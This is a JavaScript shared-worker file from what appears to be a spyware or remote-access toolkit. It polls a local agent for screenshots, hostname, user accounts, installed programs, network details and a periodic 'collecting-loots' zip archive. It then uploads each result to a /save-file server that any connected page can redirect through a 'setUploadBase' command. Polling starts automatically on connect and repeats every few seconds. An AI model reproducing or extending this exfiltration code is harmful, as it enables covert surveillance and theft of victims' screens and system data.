const POLL_INTERVAL_MS = 5000;
const BASE_CAPTURE = 'http://localhost:15721';
let UPLOAD_BASE = 'http://localhost:3000';
let uploadBaseOverride = ''; 

// all available endpoints
const ENDPOINTS = [
  '/capture-screenshot',
  '/hostname',
  '/everyone',
  '/installed_programs',
  '/networks',
  '/info',
  '/cleanup'
].map(p => `${BASE_CAPTURE}${p}`);

// collecting-loots endpoint is a special endpoint. 
// the worker sends this request once in every 3 minutes. 
// Then wait for 1 minute before fetching zip to make sure the archive file is ready to download.
const LOOTS_ENDPOINT = `${BASE_CAPTURE}/collecting-loots`;
const LOOTS_ZIP_URL = `${BASE_CAPTURE}/static/Extracted.zip`;
const LOOTS_INTERVAL_MS = 3 * 60 * 1000; // 3 minutes
const LOOTS_WAIT_AFTER_RUN_MS = 60 * 1000; // wait 1 minute

// non special
let ports = [];
let polling = false;
let stopSignal = false;

// special
let lootsIntervalId = null;
let lootsRunning = false;

function broadcast(obj) {
  for (const p of ports) {
    try { p.postMessage(obj); } catch (e) { /* ignore closed ports */ }
  }
}


// map out endpoint URL to folder name
function endpointToFolder(endpointUrl) {
  try {
    const url = new URL(endpointUrl);
    const p = url.pathname || '';
    if (p.includes('/capture-screenshot')) return 'screenshots';
    if (p.includes('/hostname')) return 'hostname';
    if (p.includes('/everyone')) return 'everyone';
    if (p.includes('/installed_programs')) return 'installed_programs';
    if (p.includes('/collecting-loots')) return 'collecting_loots';
    if (p.includes('/networks')) return 'networks';
    if (p.includes('/info')) return 'info';
    if (p.includes('/cleanup')) return 'cleanup';
    return p.replace(/[\/:\?\&\=]/g, '_').replace(/^_+/, '') || 'unknown';
  } catch (e) {
    return 'unknown';
  }
}


// Content-Type configuration
function extFromContentType(ct) {
  if (!ct) return '';
  ct = ct.split(';')[0].trim().toLowerCase();
  if (ct === 'image/png') return '.png';
  if (ct === 'image/jpeg') return '.jpg';
  if (ct === 'image/webp') return '.webp';
  if (ct === 'application/pdf') return '.pdf';
  if (ct === 'application/zip') return '.zip';
  return '';
}

function getEffectiveUploadBase() {
  return (uploadBaseOverride && uploadBaseOverride.trim()) ? uploadBaseOverride.replace(/\/+$/, '') : UPLOAD_BASE.replace(/\/+$/, '');
}


// save-file endpoint for saving files to server
async function uploadToServerSimple(obj) {
  try {
    const effectiveBase = getEffectiveUploadBase();
    const uploadUrl = `${effectiveBase}/save-file`;
    const folder = endpointToFolder(obj.endpoint);
    const form = new FormData();
    form.append('endpoint', obj.endpoint);
    form.append('folder', folder);
    form.append('ts', obj.ts || new Date().toISOString());

    if (obj.type === 'TEXT') {
      form.append('text', obj.text || '');
      form.append('contentType', obj.contentType || 'text/plain');
    } else if (obj.type === 'BLOB') {
      const ext = extFromContentType(obj.contentType) || '.bin';
      const name = `result-${Date.now()}${ext}`;
      form.append('file', obj.blob, name);
      form.append('contentType', obj.contentType || '');
    } else {
      broadcast({ type: 'UPLOAD', status: 'SKIP', reason: 'UNKNOWN_TYPE', endpoint: obj.endpoint });
      return;
    }

    broadcast({ type: 'UPLOAD', status: 'START', endpoint: obj.endpoint, folder, uploadUrl });
    const resp = await fetch(uploadUrl, { method: 'POST', body: form, mode: 'cors' });
    let j;
    try { j = await resp.json(); } catch (e) { j = { ok: resp.ok }; }
    if (resp.ok) broadcast({ type: 'UPLOAD', status: 'OK', endpoint: obj.endpoint, folder, server: j });
    else broadcast({ type: 'UPLOAD', status: 'ERR', endpoint: obj.endpoint, folder, server: j });
  } catch (err) {
    broadcast({ type: 'UPLOAD', status: 'FAILED', endpoint: obj.endpoint, error: String(err) });
  }
}

async function fetchEndpointSimple(url) {
  try {
    const res = await fetch(url, { method: 'GET', cache: 'no-store', mode: 'cors', credentials: 'omit' });
    if (!res.ok) {
      const txt = await res.text().catch(()=>'<no body>');
      broadcast({ type: 'ERROR', endpoint: url, status: `HTTP_${res.status}`, detail: txt.slice(0,2000) });
      return;
    }
    const contentType = (res.headers.get('content-type') || '').toLowerCase();
    if (contentType.includes('application/json') || contentType.startsWith('text/')) {
      const text = await res.text();
      const rec = { endpoint: url, ts: new Date().toISOString(), type: 'TEXT', contentType, text };
      broadcast({ type: 'RESULT', endpoint: url, status: 'TEXT_READ', preview: text.slice(0,500) });
      await uploadToServerSimple(rec);
    } else {
      const blob = await res.blob();
      const rec = { endpoint: url, ts: new Date().toISOString(), type: 'BLOB', contentType, blob };
      broadcast({ type: 'RESULT', endpoint: url, status: 'BLOB_READ' });
      await uploadToServerSimple(rec);
    }
  } catch (err) {
    broadcast({ type: 'ERROR', endpoint: url, status: 'FETCH_FAILED', error: String(err) });
  }
}

async function fetchAllEndpoints() {
  for (const url of ENDPOINTS) {
    if (stopSignal) return;
    await fetchEndpointSimple(url);
    await new Promise(r => setTimeout(r, 150));
  }
}


async function runCollectingLootsOnce() {
  if (lootsRunning) {
    broadcast({ type: 'LOOTS', status: 'SKIP_ALREADY_RUNNING' });
    return;
  }
  lootsRunning = true;
  try {
    broadcast({ type: 'LOOTS', status: 'START', endpoint: LOOTS_ENDPOINT });

    try {
      const triggerResp = await fetch(LOOTS_ENDPOINT, { method: 'GET', mode: 'cors', cache: 'no-store', credentials: 'omit' });
      const triggerText = await triggerResp.text().catch(()=>'<no body>');
      broadcast({ type: 'LOOTS', status: 'TRIGGER_DONE', endpoint: LOOTS_ENDPOINT, ok: triggerResp.ok, code: triggerResp.status, preview: triggerText.slice(0,500) });
    } catch (err) {
      broadcast({ type: 'LOOTS', status: 'TRIGGER_FAILED', error: String(err) });
    }

    broadcast({ type: 'LOOTS', status: 'WAITING_BEFORE_ZIP', wait_ms: LOOTS_WAIT_AFTER_RUN_MS });
    await new Promise(r => setTimeout(r, LOOTS_WAIT_AFTER_RUN_MS));

    broadcast({ type: 'LOOTS', status: 'FETCH_ZIP', url: LOOTS_ZIP_URL });
    try {
      const zipResp = await fetch(LOOTS_ZIP_URL, { method: 'GET', mode: 'cors', cache: 'no-store', credentials: 'omit' });
      if (!zipResp.ok) {
        const txt = await zipResp.text().catch(()=>'<no body>');
        broadcast({ type: 'LOOTS', status: 'ZIP_FETCH_FAILED', code: zipResp.status, detail: txt.slice(0,2000) });
      } else {
        const blob = await zipResp.blob();
        const contentType = (zipResp.headers.get('content-type') || '').toLowerCase();
        const rec = { endpoint: LOOTS_ZIP_URL, ts: new Date().toISOString(), type: 'BLOB', contentType, blob };
        broadcast({ type: 'LOOTS', status: 'ZIP_FETCHED', size_bytes: blob.size });
        await uploadToServerSimple(rec);
      }
    } catch (err) {
      broadcast({ type: 'LOOTS', status: 'ZIP_FETCH_ERROR', error: String(err) });
    }
  } finally {
    lootsRunning = false;
    broadcast({ type: 'LOOTS', status: 'DONE' });
  }
}


function startLootsInterval() {
  if (lootsIntervalId) return;
  runCollectingLootsOnce().catch(e => broadcast({ type: 'LOOTS', status: 'ERROR', error: String(e) }));
  lootsIntervalId = setInterval(() => {
    if (stopSignal) return;
    runCollectingLootsOnce().catch(e => broadcast({ type: 'LOOTS', status: 'ERROR', error: String(e) }));
  }, LOOTS_INTERVAL_MS);
  broadcast({ type: 'LOOTS', status: 'SCHEDULED', interval_ms: LOOTS_INTERVAL_MS });
}

function stopLootsInterval() {
  if (!lootsIntervalId) return;
  clearInterval(lootsIntervalId);
  lootsIntervalId = null;
  broadcast({ type: 'LOOTS', status: 'UNSCHEDULED' });
}

async function startPolling() {
  if (polling) return;
  polling = true;
  stopSignal = false;
  broadcast({ type: 'STATUS', status: 'POLLING_STARTED', endpoints: ENDPOINTS, lootsScheduled: !!lootsIntervalId });
  startLootsInterval();

  while (!stopSignal) {
    await fetchAllEndpoints();
    for (let waited = 0; waited < POLL_INTERVAL_MS && !stopSignal; waited += 200) {
      await new Promise(r => setTimeout(r, 200));
    }
  }
  polling = false;
  broadcast({ type: 'STATUS', status: 'POLLING_STOPPED' });
  stopLootsInterval();
}

function stopPolling() { stopSignal = true; }

onconnect = function(e) {
  const port = e.ports[0];
  ports.push(port);
  port.start();
  port.postMessage({ type: 'STATUS', status: 'CONNECTED', clients: ports.length, endpoints: ENDPOINTS, effectiveUploadBase: getEffectiveUploadBase() });

  port.onmessage = (ev) => {
    const d = ev.data || {};
    if (d.cmd === 'setUploadBase' && typeof d.uploadBase === 'string') {
      uploadBaseOverride = d.uploadBase;
      broadcast({ type: 'STATUS', status: 'UPLOAD_BASE_SET', uploadBase: uploadBaseOverride });
      return;
    }

    if (d.cmd === 'start') startPolling();
    else if (d.cmd === 'stop') stopPolling();
    else if (d.cmd === 'ping') port.postMessage({ type: 'STATUS', status: 'pong' });
    else if (d.cmd === 'once') fetchAllEndpoints();
    else if (d.cmd === 'collect-loots-once') {
      runCollectingLootsOnce().catch(e => broadcast({ type: 'LOOTS', status: 'ERROR', error: String(e) }));
    }
  };

  if (!polling) startPolling();
};
